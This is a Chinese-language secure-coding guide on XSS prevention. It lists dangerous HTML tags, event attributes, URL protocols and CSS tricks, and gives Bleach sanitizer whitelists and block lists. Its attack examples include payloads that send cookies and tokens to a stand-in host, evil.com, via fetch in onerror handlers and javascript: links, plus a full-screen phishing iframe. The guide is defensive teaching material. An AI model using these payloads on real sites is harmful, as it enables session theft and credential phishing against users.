# 🚨 HTML/JavaScript 不安全标签和属性清单

## 📋 完整的危险标签列表

### 1️⃣ 可以直接执行 JavaScript 的标签

| 标签 | 危险原因 | 攻击示例 |
|------|---------|---------|
| `<script>` | 直接执行 JS 代码 | `<script>alert('XSS')</script>` |
| `<iframe>` | 嵌入外部页面，可执行代码 | `<iframe src="javascript:alert('XSS')">` |
| `<object>` | 嵌入插件或外部资源 | `<object data="javascript:alert('XSS')">` |
| `<embed>` | 嵌入外部内容 | `<embed src="malware.swf">` |
| `<applet>` | Java 小程序（已废弃但仍危险） | `<applet code="Malware.class">` |
| `<meta>` | 可以重定向或刷新页面 | `<meta http-equiv="refresh" content="0;url=evil.com">` |
| `<link>` | 可以加载外部资源 | `<link rel="import" href="evil.html">` |
| `<base>` | 改变相对 URL 的基础路径 | `<base href="http://evil.com/">` |

---

### 2️⃣ 可以间接执行代码的标签

| 标签 | 危险原因 | 攻击示例 |
|------|---------|---------|
| `<img>` | 通过 `onerror` 等事件执行代码 | `<img src=x onerror="alert('XSS')">` |
| `<svg>` | 可以嵌入 `<script>` 或事件 | `<svg><script>alert('XSS')</script></svg>` |
| `<video>` | 通过事件属性执行代码 | `<video src=x onerror="alert('XSS')">` |
| `<audio>` | 同 video | `<audio src=x onerror="alert('XSS')">` |
| `<body>` | 通过 `onload` 等事件 | `<body onload="alert('XSS')">` |
| `<input>` | 通过 `onfocus` 等事件 | `<input onfocus="alert('XSS')" autofocus>` |
| `<form>` | 可以提交数据到外部 | `<form action="http://evil.com"><input name="password">` |
| `<button>` | 通过 `onclick` 事件 | `<button onclick="alert('XSS')">点击</button>` |

---

### 3️⃣ 可以加载外部资源的标签

| 标签 | 危险原因 | 攻击示例 |
|------|---------|---------|
| `<style>` | 可以通过 CSS 泄露数据 | `<style>@import 'http://evil.com/steal?data=...'</style>` |
| `<link>` | 加载外部 CSS/资源 | `<link rel="stylesheet" href="http://evil.com/evil.css">` |

---

## ⚡ 危险的 HTML 属性（事件处理器）

### 所有 `on*` 开头的事件属性都危险

```html
<!-- 鼠标事件 -->
<div onclick="alert('XSS')">点击我</div>
<div onmouseover="alert('XSS')">悬停</div>
<div onmouseout="alert('XSS')">移开</div>
<div ondblclick="alert('XSS')">双击</div>

<!-- 键盘事件 -->
<input onkeydown="alert('XSS')">
<input onkeypress="alert('XSS')">
<input onkeyup="alert('XSS')">

<!-- 表单事件 -->
<input onfocus="alert('XSS')" autofocus>
<input onblur="alert('XSS')">
<input onchange="alert('XSS')">
<form onsubmit="alert('XSS')">
<input oninput="alert('XSS')">

<!-- 加载事件 -->
<body onload="alert('XSS')">
<img onerror="alert('XSS')" src=x>
<img onload="alert('XSS')" src="data:image/png;base64,...">

<!-- 其他危险事件 -->
<div onanimationend="alert('XSS')">
<div ontransitionend="alert('XSS')">
<video oncanplay="alert('XSS')">
<marquee onstart="alert('XSS')">
```

### 完整的危险事件属性列表

```
onabort, onactivate, onafterprint, onafterupdate, 
onbeforeactivate, onbeforecopy, onbeforecut, onbeforedeactivate, 
onbeforeeditfocus, onbeforepaste, onbeforeprint, onbeforeunload, 
onbeforeupdate, onblur, onbounce, oncellchange, onchange, 
onclick, oncontextmenu, oncontrolselect, oncopy, oncut, 
ondataavailable, ondatasetchanged, ondatasetcomplete, ondblclick, 
ondeactivate, ondrag, ondragend, ondragenter, ondragleave, 
ondragover, ondragstart, ondrop, onerror, onerrorupdate, 
onfilterchange, onfinish, onfocus, onfocusin, onfocusout, 
onhelp, onkeydown, onkeypress, onkeyup, onlayoutcomplete, 
onload, onlosecapture, onmousedown, onmouseenter, onmouseleave, 
onmousemove, onmouseout, onmouseover, onmouseup, onmousewheel, 
onmove, onmoveend, onmovestart, onpaste, onpropertychange, 
onreadystatechange, onreset, onresize, onresizeend, onresizestart, 
onrowenter, onrowexit, onrowsdelete, onrowsinserted, onscroll, 
onselect, onselectionchange, onselectstart, onstart, onstop, 
onsubmit, onunload
```

---

## 🔗 危险的 URL 协议（伪协议）

### 可以执行 JavaScript 的协议

```html
<!-- javascript: 伪协议 -->
<a href="javascript:alert('XSS')">点击</a>
<img src="javascript:alert('XSS')">
<iframe src="javascript:alert('XSS')">

<!-- data: 协议（可以包含脚本） -->
<iframe src="data:text/html,<script>alert('XSS')</script>">
<object data="data:text/html,<script>alert('XSS')</script>">

<!-- vbscript: 伪协议（IE） -->
<a href="vbscript:msgbox('XSS')">点击</a>

<!-- file: 协议（读取本地文件） -->
<iframe src="file:///etc/passwd">
```

### 安全的协议（白名单）

```
http:
https:
mailto:
ftp:
tel:
```

---

## 🎨 CSS 注入攻击

### 通过 style 属性攻击

```html
<!-- expression() - IE 专有，已废弃但仍危险 -->
<div style="background: expression(alert('XSS'))">

<!-- behavior - IE 专有 -->
<div style="behavior: url(xss.htc)">

<!-- @import - 加载外部 CSS -->
<style>@import 'http://evil.com/steal.css'</style>

<!-- url() - 泄露数据 -->
<style>
  body { background: url('http://evil.com/track?cookie=' + document.cookie); }
</style>
```

---

## 🛡️ Bleach 的安全配置示例

### 推荐的安全标签白名单（用于笔记系统）

```python
allowed_tags = [
    # ===== 文本结构 =====
    'h1', 'h2', 'h3', 'h4', 'h5', 'h6',  # 标题
    'p', 'br', 'hr',                      # 段落、换行、分隔线
    'div', 'span',                        # 容器
    
    # ===== 文本格式 =====
    'strong', 'b',                        # 加粗
    'em', 'i',                            # 斜体
    'u',                                  # 下划线
    's', 'del', 'strike',                 # 删除线
    'ins',                                # 插入（下划线）
    'sub', 'sup',                         # 下标、上标
    'mark',                               # 高亮
    'small',                              # 小字
    
    # ===== 链接和图片 =====
    'a',                                  # 链接（需限制 href 协议）
    'img',                                # 图片（需限制 src 协议）
    
    # ===== 列表 =====
    'ul', 'ol', 'li',                     # 无序列表、有序列表、列表项
    'dl', 'dt', 'dd',                     # 定义列表
    
    # ===== 引用和代码 =====
    'blockquote',                         # 引用块
    'pre', 'code',                        # 代码块、行内代码
    'kbd', 'samp', 'var',                 # 键盘输入、示例输出、变量
    
    # ===== 表格 =====
    'table', 'thead', 'tbody', 'tfoot',   # 表格结构
    'tr', 'th', 'td',                     # 表格行、表头、单元格
    'caption', 'col', 'colgroup',         # 表格标题、列
    
    # ===== 其他 =====
    'abbr', 'cite', 'q',                  # 缩写、引用、短引用
    'time',                               # 时间
    'details', 'summary',                 # 折叠区域
]
```

### 推荐的安全属性白名单

```python
allowed_attributes = {
    # 链接
    'a': ['href', 'title', 'target', 'rel'],
    
    # 图片
    'img': ['src', 'alt', 'title', 'width', 'height'],
    
    # 代码高亮
    'code': ['class'],  # 仅允许 class，用于语言标识（如 language-python）
    'pre': ['class'],
    
    # 表格
    'td': ['colspan', 'rowspan'],
    'th': ['colspan', 'rowspan', 'scope'],
    'col': ['span'],
    'colgroup': ['span'],
    
    # 通用容器（谨慎使用）
    'div': ['class', 'id'],  # 如果需要自定义样式
    'span': ['class', 'id'],
    
    # 时间
    'time': ['datetime'],
    
    # 缩写
    'abbr': ['title'],
}
```

### 推荐的安全协议白名单

```python
allowed_protocols = [
    'http',
    'https',
    'mailto',
    'ftp',     # 如果需要文件下载链接
    'tel',     # 如果需要电话链接
]
```

---

## 🚫 绝对不能允许的标签和属性

### 永远禁止的标签

```python
NEVER_ALLOW = [
    'script',      # JavaScript 代码
    'iframe',      # 内嵌框架
    'object',      # 外部对象
    'embed',       # 嵌入内容
    'applet',      # Java 小程序
    'meta',        # 元信息（可以重定向）
    'link',        # 外部资源
    'base',        # 基础 URL
    'form',        # 表单（可以提交数据）
    'input',       # 输入框
    'button',      # 按钮
    'select',      # 下拉框
    'textarea',    # 文本域
    'style',       # 内联样式（可以 CSS 注入）
]
```

### 永远禁止的属性

```python
NEVER_ALLOW_ATTRIBUTES = [
    # 所有事件处理器
    'on*',         # onclick, onload, onerror, 等等
    
    # 危险的样式属性
    'style',       # 内联样式（如果需要，要严格过滤）
    
    # 表单相关
    'action',      # 表单提交地址
    'method',      # 表单提交方法
    'formaction',  # 按钮的提交地址
]
```

### 永远禁止的协议

```python
NEVER_ALLOW_PROTOCOLS = [
    'javascript',  # JavaScript 伪协议
    'data',        # Data URL（可以包含脚本）
    'vbscript',    # VBScript 伪协议
    'file',        # 本地文件
    'about',       # about: URL
]
```

---

## 🔍 真实攻击案例

### 案例 1：图片 onerror 攻击

```html
<!-- 攻击者输入 -->
<img src="nonexistent.jpg" onerror="fetch('http://evil.com/steal?cookie=' + document.cookie)">

<!-- 用户看到 -->
图片加载失败（看起来很正常）

<!-- 实际发生 -->
用户的 Cookie 被发送到 evil.com
```

### 案例 2：SVG 内嵌脚本

```html
<!-- 攻击者输入 -->
<svg/onload=alert('XSS')>

<!-- 或者 -->
<svg><script>alert('XSS')</script></svg>

<!-- 结果 -->
脚本被执行
```

### 案例 3：JavaScript 伪协议

```html
<!-- 攻击者输入 -->
<a href="javascript:void(fetch('http://evil.com/steal?token=' + localStorage.getItem('token')))">
  点击查看详情
</a>

<!-- 用户点击后 -->
Token 被窃取
```

### 案例 4：iframe 钓鱼

```html
<!-- 攻击者输入 -->
<iframe src="http://fake-login.com" style="width:100%;height:100%;position:fixed;top:0;left:0;"></iframe>

<!-- 用户看到 -->
一个伪造的登录页面覆盖整个屏幕

<!-- 结果 -->
用户在假页面输入密码，被攻击者窃取
```

---

## ✅ 安全的替代方案

### 如果需要展示代码示例

```html
<!-- ❌ 危险：直接嵌入 script -->
<script>console.log('示例代码')</script>

<!-- ✅ 安全：使用 pre + code -->
<pre><code class="language-javascript">
console.log('示例代码')
</code></pre>
```

### 如果需要嵌入外部内容

```html
<!-- ❌ 危险：iframe -->
<iframe src="https://youtube.com/embed/..."></iframe>

<!-- ✅ 安全：只保存 URL，由前端控制是否展示 -->
<!-- 在数据库中存储 URL，前端用白名单验证域名后再渲染 iframe -->
```

### 如果需要交互功能

```html
<!-- ❌ 危险：内联事件 -->
<button onclick="handleClick()">点击</button>

<!-- ✅ 安全：在 Vue/React 组件中绑定事件 -->
<button @click="handleClick">点击</button>
```

---

## 📚 参考资源

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [HTML5 Security Cheat Sheet](https://html5sec.org/)
- [Bleach 文档](https://bleach.readthedocs.io/)
- [Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)

---

## 🎯 快速检查清单

在允许任何 HTML 标签或属性之前，问自己：

- [ ] 这个标签可以执行 JavaScript 吗？
- [ ] 这个属性是事件处理器（on* 开头）吗？
- [ ] 这个 URL 协议是 javascript: 或 data: 吗？
- [ ] 这个标签可以加载外部资源吗？
- [ ] 这个标签可以提交数据到外部服务器吗？

**如果任何一个答案是"是"，就不要允许！**
